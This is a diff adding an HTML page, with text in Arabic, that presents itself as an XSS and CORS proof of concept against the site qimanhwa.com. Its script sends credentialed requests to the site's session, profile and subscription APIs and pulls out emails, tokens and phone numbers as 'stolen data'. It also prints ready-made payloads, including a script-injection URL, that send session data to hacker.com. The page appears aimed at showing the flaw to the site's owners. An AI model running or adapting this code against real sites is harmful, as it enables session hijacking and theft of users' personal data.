@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Proof of Concept - Hacker's Fake Page</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0f;
+            color: #e0e0e0;
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
+            padding: 20px;
+        }
+        .container { max-width: 900px; margin: 0 auto; }
+        h1 { color: #ff4444; text-align: center; margin-bottom: 10px; font-size: 1.5em; }
+        .subtitle { color: #888; text-align: center; margin-bottom: 30px; font-size: 0.9em; }
+        .phase {
+            background: #12121a;
+            border: 1px solid #2a2a3a;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .phase-title {
+            color: #bb86fc;
+            font-size: 1.1em;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #2a2a3a;
+            padding-bottom: 8px;
+        }
+        .step { margin: 8px 0; padding: 5px 0; font-size: 0.85em; }
+        .step.waiting { color: #666; }
+        .step.running { color: #ffaa00; }
+        .step.success { color: #00ff88; }
+        .step.fail { color: #ff4444; }
+        .step.info { color: #4fc3f7; }
+        .stolen-data {
+            background: #1a0000;
+            border: 2px solid #ff4444;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+            display: none;
+        }
+        .stolen-data h2 { color: #ff4444; margin-bottom: 15px; }
+        .data-item {
+            background: #0d0d15;
+            border: 1px solid #333;
+            border-radius: 4px;
+            padding: 10px;
+            margin: 8px 0;
+            font-size: 0.85em;
+            word-break: break-all;
+        }
+        .data-item .label { color: #ff6666; font-weight: bold; }
+        .data-item .value { color: #00ff88; margin-top: 4px; }
+        .warning-box {
+            background: #1a1a00;
+            border: 2px solid #ffaa00;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        .warning-box p { color: #ffaa00; font-size: 0.9em; }
+        .iframe-container {
+            width: 1px; height: 1px; overflow: hidden; position: absolute; left: -9999px;
+        }
+        .btn {
+            background: #ff4444;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 6px;
+            font-size: 1em;
+            cursor: pointer;
+            display: block;
+            margin: 20px auto;
+            font-family: inherit;
+        }
+        .btn:hover { background: #ff6666; }
+        .btn:disabled { background: #444; cursor: not-allowed; }
+        #attackLog {
+            background: #0d0d15;
+            border: 1px solid #2a2a3a;
+            border-radius: 4px;
+            padding: 15px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-size: 0.8em;
+            line-height: 1.6;
+        }
+        .log-line { margin: 2px 0; }
+        .log-time { color: #666; }
+        .log-ok { color: #00ff88; }
+        .log-warn { color: #ffaa00; }
+        .log-err { color: #ff4444; }
+        .log-info { color: #4fc3f7; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔴 XSS Attack Simulation - Proof of Concept</h1>
+        <p class="subtitle">
+            هذه الصفحة تحاكي ما يحدث عندما يضغط مستخدم مسجل دخول على رابط XSS خبيث
+            <br>افتح هذه الصفحة وأنت مسجل دخول في qimanhwa.com عشان تشوف النتيجة
+        </p>
+
+        <button class="btn" id="startBtn" onclick="startAttack()">
+            ▶ ابدأ محاكاة الهجوم
+        </button>
+
+        <div class="phase">
+            <div class="phase-title">📡 سجل الهجوم المباشر</div>
+            <div id="attackLog"></div>
+        </div>
+
+        <div class="stolen-data" id="stolenData">
+            <h2>🔓 البيانات المسروقة</h2>
+            <div id="dataItems"></div>
+        </div>
+
+        <div class="warning-box" id="warningBox" style="display:none">
+            <p>⚠️ لو ظهرت بيانات فوق - ده معناه إن أي هاكر يقدر يعمل نفس الكلام ده</p>
+            <p>⚠️ الهاكر هيبعت اللينك ده لأي مستخدم مشترك وهيسرق بياناته</p>
+        </div>
+
+        <div class="iframe-container">
+            <iframe id="hiddenFrame" sandbox="allow-same-origin"></iframe>
+        </div>
+    </div>
+
+    <script>
+        const TARGET = 'https://qimanhwa.com';
+        const API_BASE = 'https://api.qimanhwa.com';
+
+        function log(msg, type = 'info') {
+            const logDiv = document.getElementById('attackLog');
+            const time = new Date().toLocaleTimeString();
+            const cls = {ok: 'log-ok', warn: 'log-warn', err: 'log-err', info: 'log-info'}[type] || 'log-info';
+            logDiv.innerHTML += `<div class="log-line"><span class="log-time">[${time}]</span> <span class="${cls}">${msg}</span></div>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        function addStolenData(label, value) {
+            const container = document.getElementById('dataItems');
+            document.getElementById('stolenData').style.display = 'block';
+            container.innerHTML += `
+                <div class="data-item">
+                    <div class="label">${label}</div>
+                    <div class="value">${value}</div>
+                </div>
+            `;
+        }
+
+        async function startAttack() {
+            const btn = document.getElementById('startBtn');
+            btn.disabled = true;
+            btn.textContent = '⏳ جاري الهجوم...';
+
+            log('=== بدء محاكاة هجوم XSS ===', 'err');
+            log('السيناريو: مستخدم مسجل دخول ضغط على رابط خبيث', 'warn');
+            log('', 'info');
+
+            // Step 1: Check if cookies are accessible
+            log('🔍 الخطوة 1: فحص الكوكيز المتاحة...', 'info');
+            await sleep(500);
+
+            const cookies = document.cookie;
+            if (cookies) {
+                log(`✅ كوكيز موجودة: ${cookies.substring(0, 100)}`, 'ok');
+                addStolenData('🍪 Cookies (document.cookie)', cookies || '(empty - HttpOnly cookies hidden from JS)');
+            } else {
+                log('ℹ️ مفيش كوكيز متاحة لـ JavaScript من هنا (مختلف الدومين)', 'info');
+                log('ℹ️ لكن لو الـ XSS على qimanhwa.com نفسه، الكوكيز هتكون متاحة!', 'warn');
+            }
+            await sleep(500);
+
+            // Step 2: Try to fetch session data via API
+            log('', 'info');
+            log('🔍 الخطوة 2: محاولة جلب بيانات الـ Session من API...', 'info');
+            await sleep(500);
+
+            const endpoints = [
+                { url: `${API_BASE}/api/auth/get-session`, name: 'Session Data' },
+                { url: `${TARGET}/api/auth/session`, name: 'Auth Session' },
+                { url: `${TARGET}/api/auth/me`, name: 'User Profile' },
+                { url: `${TARGET}/api/auth/csrf`, name: 'CSRF Token' },
+                { url: `${TARGET}/api/user`, name: 'User Data' },
+                { url: `${TARGET}/api/subscription`, name: 'Subscription Info' },
+            ];
+
+            for (const ep of endpoints) {
+                try {
+                    log(`  → جاري فحص: ${ep.url}`, 'info');
+                    const resp = await fetch(ep.url, {
+                        method: 'GET',
+                        credentials: 'include',
+                        headers: { 'Accept': 'application/json' },
+                    });
+
+                    const status = resp.status;
+                    log(`  ← HTTP ${status}`, status === 200 ? 'ok' : 'warn');
+
+                    if (status === 200) {
+                        const contentType = resp.headers.get('content-type') || '';
+                        let body;
+                        try {
+                            body = await resp.text();
+                        } catch(e) {
+                            body = '(could not read body)';
+                        }
+
+                        if (body && body.length > 2) {
+                            log(`  ✅ بيانات مسروقة! (${body.length} bytes)`, 'err');
+
+                            try {
+                                const json = JSON.parse(body);
+                                addStolenData(`📡 ${ep.name} (${ep.url})`, JSON.stringify(json, null, 2));
+
+                                // Extract specific fields
+                                const extract = (obj, prefix = '') => {
+                                    if (!obj || typeof obj !== 'object') return;
+                                    for (const [k, v] of Object.entries(obj)) {
+                                        const key = prefix ? `${prefix}.${k}` : k;
+                                        if (['email', 'username', 'name', 'id', 'role', 'token',
+                                             'subscription', 'plan', 'avatar', 'phone'].includes(k.toLowerCase())) {
+                                            log(`    🔴 ${key}: ${JSON.stringify(v).substring(0, 80)}`, 'err');
+                                        }
+                                        if (typeof v === 'object' && v !== null) {
+                                            extract(v, key);
+                                        }
+                                    }
+                                };
+                                extract(json);
+
+                            } catch(e) {
+                                addStolenData(`📡 ${ep.name}`, body.substring(0, 500));
+                            }
+                        }
+                    }
+                } catch(e) {
+                    log(`  ❌ ${ep.name}: ${e.message.substring(0, 60)}`, 'warn');
+                }
+                await sleep(300);
+            }
+
+            // Step 3: localStorage / sessionStorage
+            log('', 'info');
+            log('🔍 الخطوة 3: فحص localStorage و sessionStorage...', 'info');
+            log('  ℹ️ ده بيشتغل بس لو الـ XSS على نفس الدومين', 'info');
+            await sleep(300);
+
+            // Step 4: Demonstrate what XSS on the actual domain would do
+            log('', 'info');
+            log('🔍 الخطوة 4: محاكاة ما سيحدث لو الـ XSS على نفس الدومين...', 'info');
+            log('  ⚠️ لو الكود ده اشتغل على qimanhwa.com نفسه (عبر ثغرة XSS):', 'warn');
+            log('  → document.cookie هيرجع كل الكوكيز اللي مش HttpOnly', 'warn');
+            log('  → fetch("/api/auth/get-session") هيرجع بيانات المستخدم', 'warn');
+            log('  → localStorage.getItem("token") هيرجع التوكن لو موجود', 'warn');
+            log('  → الهاكر هيبعت كل البيانات دي لسيرفره:', 'warn');
+            log('    new Image().src = "https://hacker.com/steal?data=" + encodeURIComponent(JSON.stringify({cookies: document.cookie, session: await fetch("/api/auth/get-session").then(r=>r.json())}))', 'err');
+
+            await sleep(500);
+
+            // Step 5: Show CORS status
+            log('', 'info');
+            log('🔍 الخطوة 5: فحص CORS (Cross-Origin Resource Sharing)...', 'info');
+            try {
+                const corsTest = await fetch(`${API_BASE}/api/auth/get-session`, {
+                    credentials: 'include',
+                    mode: 'cors',
+                });
+                if (corsTest.ok) {
+                    log('  🔴 CORS مفتوح! API يقبل طلبات من أي دومين!', 'err');
+                    const data = await corsTest.text();
+                    if (data && data.length > 5) {
+                        log(`  🔴 رد الـ API (${data.length} bytes): ${data.substring(0, 200)}`, 'err');
+                        addStolenData('🔴 CORS Bypass - API Response', data.substring(0, 1000));
+                    }
+                } else {
+                    log(`  ℹ️ CORS status: ${corsTest.status}`, 'info');
+                }
+            } catch(e) {
+                log(`  ✅ CORS blocked from this origin (${e.message.substring(0, 40)})`, 'ok');
+                log('  ℹ️ لكن لو الـ XSS على qimanhwa.com نفسه، مفيش CORS مشكلة!', 'warn');
+            }
+
+            log('', 'info');
+            log('=== انتهت المحاكاة ===', 'err');
+            log('', 'info');
+            log('الخلاصة:', 'warn');
+            log('لو هاكر بعت لمستخدم لينك زي:', 'warn');
+            log(`${TARGET}/series?tag=<script>fetch("${API_BASE}/api/auth/get-session").then(r=>r.json()).then(d=>new Image().src="https://hacker.com?d="+btoa(JSON.stringify(d)))</script>`, 'err');
+            log('الكود ده هيسرق session المستخدم ويبعتها للهاكر', 'err');
+
+            document.getElementById('warningBox').style.display = 'block';
+
+            btn.textContent = '✅ انتهت المحاكاة';
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+    </script>
+</body>
+</html>
